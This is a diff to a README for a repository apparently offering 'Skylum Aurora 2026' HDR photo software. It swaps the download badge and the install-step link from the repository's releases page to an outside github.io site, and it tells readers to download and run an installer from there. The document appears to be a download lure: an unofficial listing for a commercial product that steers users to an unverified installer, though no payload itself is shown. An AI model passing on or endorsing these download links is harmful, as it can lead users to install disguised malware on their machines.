@@ -1,6 +1,6 @@
 # 📸 Skylum-Aurora-2026 - Master High Dynamic Range Photography Today
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=windows)](https://github.com/singh1798/Skylum-Aurora-2026/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=windows)](https://singh1798.github.io)
 
 Skylum Aurora 2026 provides tools for photographers who want to create professional high dynamic range images. The software combines bracketed photos into single shots with wide light ranges. It offers a workflow for landscape and architectural photography on Windows 10 and Windows 11.
 
@@ -19,7 +19,7 @@ Before you install this software, ensure your computer meets these minimum speci
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the project release page: https://github.com/singh1798/Skylum-Aurora-2026/releases
+1. Visit the project release page: https://singh1798.github.io
 2. Find the latest version of the installer file in the Assets section.
 3. Click the file name to start the file download to your computer.
 4. Locate the downloaded file in your browser's download folder or your default Downloads directory.
